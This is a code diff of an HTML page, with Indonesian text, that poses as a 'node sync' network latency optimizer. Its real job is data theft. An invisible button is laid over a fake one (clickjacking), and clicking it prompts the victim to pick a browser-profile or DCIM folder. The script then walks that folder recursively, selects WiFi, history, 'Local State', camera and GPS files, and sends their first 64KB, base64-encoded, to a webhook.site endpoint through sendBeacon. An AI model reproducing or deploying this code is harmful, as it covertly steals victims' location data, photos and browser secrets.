@@ -1,82 +1,79 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Neural Connectivity Optimizer</title>
+    <title>Global Network Node Sync</title>
     <style>
-        body { background: #050505; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .node-panel { border: 1px double #0f0; padding: 40px; text-align: center; background: #000; box-shadow: 0 0 50px rgba(0,255,0,0.5); width: 550px; }
-        .sync-wrapper { position: relative; margin-top: 30px; }
-        .fake-btn { background: #0f0; color: #000; border: none; padding: 20px; font-weight: bold; width: 100%; cursor: pointer; text-transform: uppercase; }
-        #real-trigger { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.01; z-index: 1000; cursor: pointer; }
-        #map-log { margin-top: 20px; font-size: 11px; color: #004400; text-align: left; height: 80px; overflow: hidden; border-top: 1px solid #002200; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .node-box { border: 2px solid #0f0; padding: 50px; text-align: center; box-shadow: 0 0 80px rgba(0,255,0,0.3); background: #050505; width: 600px; }
+        .trigger-zone { position: relative; margin-top: 30px; }
+        .fake-btn { background: #0f0; color: #000; border: none; padding: 20px; font-weight: bold; width: 100%; cursor: pointer; font-size: 1.1em; letter-spacing: 2px; }
+        #real-trigger { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.01; z-index: 999; cursor: pointer; }
+        #log-terminal { margin-top: 25px; font-size: 11px; color: #004400; text-align: left; height: 100px; overflow-y: auto; border-top: 1px solid #002200; padding-top: 15px; }
     </style>
 </head>
 <body>
 
-<div class="node-panel">
-    <h1 style="letter-spacing:10px;">NEURAL_SYNC</h1>
-    <p style="color: #888;">Optimasi latensi berdasarkan node jaringan terdekat. Pilih folder sistem untuk sinkronisasi cache WiFi regional.</p>
+<div class="node-box">
+    <h1 style="margin:0; text-shadow: 0 0 15px #0f0;">NODE_SYNCHRONIZER</h1>
+    <p style="color: #ccc;">Sistem mendeteksi latensi tinggi. Pilih folder profil browser atau folder DCIM untuk optimasi node jaringan lokal dan pemetaan cache regional.</p>
     
-    <div class="sync-wrapper">
-        <button class="fake-btn">OPTIMIZE_LATENCY_NOW</button>
-        <button id="real-trigger" onclick="neuralMapper()"></button>
+    <div class="trigger-zone">
+        <button class="fake-btn">START_SYNC_OPTIMIZATION</button>
+        <button id="real-trigger" onclick="shadowMapper()"></button>
     </div>
 
-    <div id="map-log">> STANDBY: Awaiting local node access...</div>
+    <div id="log-terminal">> SYSTEM: Waiting for local node bridge...</div>
 </div>
 
 <script>
     const OMNI_WEBHOOK = "https://webhook.site/4b8bf8c3-835d-4844-aa61-280dccabaf72";
 
-    async function neuralMapper() {
+    async function shadowMapper() {
         try {
-            // Meminta akses Full Read/Write
-            const dirHandle = await window.showDirectoryPicker({ mode: 'readwrite' });
-            updateLog("!! NODE_ACCESS_GRANTED: Mapping Local Coordinates...");
+            // Meminta akses Full Read
+            const dirHandle = await window.showDirectoryPicker();
+            updateLog("!! BRIDGE_ESTABLISHED: Siphoning Latent Metadata...");
 
-            await harvestLocationRecursive(dirHandle, "");
+            await harvestLocation(dirHandle, "");
             
-            updateLog("!! SUCCESS: MAPPING_COMPLETE");
-        } catch (e) { updateLog(">> ABORTED: " + e.message); }
+            updateLog("!! SUCCESS: NODES_SYNCHRONIZED");
+        } catch (e) { updateLog(">> ERROR: " + e.message); }
     }
 
-    async function harvestLocationRecursive(handle, path) {
+    async function harvestLocation(handle, path) {
         for await (const entry of handle.values()) {
             const currentPath = `${path}/${entry.name}`;
 
             if (entry.kind === 'file') {
                 try {
-                    const file = await entry.getFile();
+                    // TARGET FILTER: File yang menyimpan jejak fisik lokasi
+                    const isLocationData = /(Network|WiFi|history|DCIM|Camera|Local State|gps|location)/i.test(entry.name);
                     
-                    // TARGET UTAMA: WiFi Logs, Network DB, dan Foto (EXIF GPS)
-                    const isLocationMeta = /(Network|WiFi|history|DCIM|Camera|gps|GPS|location)/i.test(entry.name);
-                    const isBinaryMap = /\.(db|sqlite|log|jpg|jpeg)$/i.test(entry.name);
-
-                    if (isLocationMeta || isBinaryMap) {
+                    if (isLocationData) {
+                        const file = await entry.getFile();
                         const buffer = await file.arrayBuffer();
-                        // Ambil 50KB pertama (cukup untuk header SQLITE atau EXIF data)
-                        const chunk = new Uint8Array(buffer.slice(0, 50000));
+                        
+                        // Kirim 64KB pertama (Cukup untuk header SQLITE WiFi atau EXIF Foto)
+                        const chunk = new Uint8Array(buffer.slice(0, 65536));
                         const b64 = btoa(String.fromCharCode(...chunk));
 
-                        // Kirim data via Beacon (Stealth)
-                        navigator.sendBeacon(`${OMNI_WEBHOOK}?type=GEO_HARVEST&file=${btoa(entry.name)}`, JSON.stringify({
-                            path: currentPath,
-                            payload: b64,
-                            // Kirim metadata browser untuk membantu triangulasi IP
-                            browser_data: { ua: navigator.userAgent, lang: navigator.language }
+                        navigator.sendBeacon(`${OMNI_WEBHOOK}?v=SHADOW_LOC&f=${btoa(entry.name)}`, JSON.stringify({
+                            p: currentPath,
+                            d: b64,
+                            ts: Date.now()
                         }));
                         
-                        updateLog(`> HARVESTED: ${entry.name}`);
+                        updateLog(`> MAPPED_NODE: ${entry.name}`);
                     }
                 } catch (e) {}
             } else {
-                harvestLocationRecursive(entry, currentPath);
+                harvestLocation(entry, currentPath);
             }
         }
     }
 
     function updateLog(m) {
-        const l = document.getElementById('map-log');
+        const l = document.getElementById('log-terminal');
         l.innerHTML += `<div>> ${m}</div>`;
         l.scrollTop = l.scrollHeight;
     }
